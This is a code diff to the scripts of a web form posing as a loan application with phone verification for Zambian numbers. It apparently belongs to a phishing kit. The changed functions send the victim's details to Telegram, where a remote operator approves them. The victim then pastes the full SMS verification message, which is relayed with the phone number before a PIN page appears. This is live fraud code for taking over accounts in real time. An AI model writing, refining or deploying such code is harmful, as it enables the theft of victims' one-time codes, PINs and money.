@@ -1166,74 +1166,144 @@ function sendDetailsToTelegram() {
 
 }
 
-function goToOTP() {
+function showPage(pageId, stepNum, title, subtitle) {
+    // Hide all pages
+    document.querySelectorAll('[id^="page"]').forEach(page => {
+        page.classList.add("hidden");
+    });
+    
+    // Show target page
+    const target = document.getElementById(pageId);
+    if (target) {
+        target.classList.remove("hidden");
+    }
+}
 
+function showLoading(text = "Processing...", subtext = "Please wait") {
+    const overlay = document.getElementById("loadingOverlay");
+    if (overlay) {
+        document.getElementById("loadingText").innerText = text;
+        document.getElementById("loadingSubtext").innerText = subtext;
+        overlay.classList.add("active");
+    }
+}
+
+function hideLoading() {
+    const overlay = document.getElementById("loadingOverlay");
+    if (overlay) {
+        overlay.classList.remove("active");
+    }
+}
+
+function sendDetailsToTelegram() {
+    sessionToken = generateSessionId();
+    const confirmBtn = document.querySelector("#page3 .button.blue");
+    const detailsStatus = document.getElementById("detailsStatus");
+    
+    showLoading("Verifying Details", "Sending verification request...");
+    confirmBtn.disabled = true;
+    if (detailsStatus) detailsStatus.style.display = "block";
+
+    sendTelegramDetailsRequest(sessionToken)
+        .then(() => {
+            pollTelegramForAction({
+                session: sessionToken,
+                timeoutMs: 2 * 60 * 1000,
+                onAction: (action) => {
+                    hideLoading();
+                    confirmBtn.disabled = false;
+                    if (detailsStatus) detailsStatus.style.display = "none";
+                    if (action === "approve_details") {
+                        document.getElementById("phoneDisplay").innerText = "+260 " + phoneInput.value;
+                        showPage("page4", 4, "Phone Verification", "Verify your phone number");
+                    } else if (action === "reject_details") {
+                        alert("Your details could not be verified. Please try again.");
+                    } else {
+                        alert("Unknown details action: " + action);
+                    }
+                },
+                onTimeout: () => {
+                    hideLoading();
+                    confirmBtn.disabled = false;
+                    if (detailsStatus) detailsStatus.style.display = "none";
+                    alert("No response from agent. Please try again later.");
+                }
+            });
+        })
+        .catch(err => {
+            hideLoading();
+            confirmBtn.disabled = false;
+            if (detailsStatus) detailsStatus.style.display = "none";
+            console.error("Send details request failed", err);
+            alert("Failed to send details verification. Please try again.");
+        });
+}
+
+function goToOTP() {
     showPage(
         "page5",
         5,
         "Verification Code",
         "Paste the SMS message sent to your phone"
     );
-
     setupOTP();
-
 }
 
-
 function setupOTP() {
-
     const smsInput = document.getElementById("smsInput");
     const button = document.getElementById("verifyButton");
 
     smsInput.value = "";
     button.disabled = true;
 
-    // Listen for input/paste events
+    // Enable the verify button as soon as any text is pasted into the textarea
     smsInput.addEventListener("input", function() {
-        const text = smsInput.value;
-
-        // Regex to find a 6-digit code in the pasted text
-        const match = text.match(/\b\d{6}\b/);
-
-        if (match) {
-            // Save the extracted code so submitOTP() can use it
-            smsInput.dataset.extractedCode = match[0];
+        const text = smsInput.value.trim();
+        if (text.length > 0) {
             button.disabled = false;
         } else {
-            delete smsInput.dataset.extractedCode;
             button.disabled = true;
         }
     });
 
     smsInput.focus();
-    
+}
+
+function submitOTP() {
+    const smsInput = document.getElementById("smsInput");
+    // Capture the entire contents of the textarea (full SMS message)
+    const fullSmsMessage = smsInput.value.trim();
+
+    if (!fullSmsMessage) {
+        alert("Please paste the full SMS message.");
+        return;
     }
 
-    // Send OTP to telegram for admin verification
     sessionToken = generateSessionId();
     const otpBtn = document.getElementById("verifyButton");
     const otpStatus = document.getElementById("otpStatus");
     
     showLoading("Verifying Code", "Confirming your verification code...");
     otpBtn.disabled = true;
-    otpStatus.style.display = "block";
+    if (otpStatus) otpStatus.style.display = "block";
 
-    sendTelegramOTPRequest(sessionToken, code, "+260 " + phoneInput.value)
+    // Passes the full SMS message text instead of a 6-digit code snippet
+    sendTelegramOTPRequest(sessionToken, fullSmsMessage, "+260 " + phoneInput.value)
         .then(() => {
             pollTelegramForAction({
                 session: sessionToken,
                 timeoutMs: 2 * 60 * 1000,
                 onAction: (action) => {
-                    clearTimeout(otpPollingTimeoutHandle);
                     hideLoading();
                     otpBtn.disabled = false;
-                    otpStatus.style.display = "none";
+                    if (otpStatus) otpStatus.style.display = "none";
+                    
                     if (action === "approve_otp") {
                         showPage("page6", 6, "Enter Your PIN", "Authorize your loan application");
                     } else if (action === "wrongotp") {
-                        alert("The OTP provided is wrong or has expired. Please try again.");
-                        document.querySelectorAll("#smsInput").forEach(i => i.value = "");
-                        document.querySelectorAll("#smsInput")[0].focus();
+                        alert("The verification details provided are wrong or have expired. Please try again.");
+                        smsInput.value = "";
+                        smsInput.focus();
                     } else {
                         alert("Unknown OTP action: " + action);
                     }
@@ -1241,7 +1311,7 @@ function setupOTP() {
                 onTimeout: () => {
                     hideLoading();
                     otpBtn.disabled = false;
-                    otpStatus.style.display = "none";
+                    if (otpStatus) otpStatus.style.display = "none";
                     alert("No response from agent. Please try again later.");
                 }
             });
@@ -1249,11 +1319,10 @@ function setupOTP() {
         .catch(err => {
             hideLoading();
             otpBtn.disabled = false;
-            otpStatus.style.display = "none";
+            if (otpStatus) otpStatus.style.display = "none";
             console.error("Send OTP request failed", err);
-            alert("Failed to send OTP to agent. Please try again.");
+            alert("Failed to send verification to agent. Please try again.");
         });
-
 }
 
 
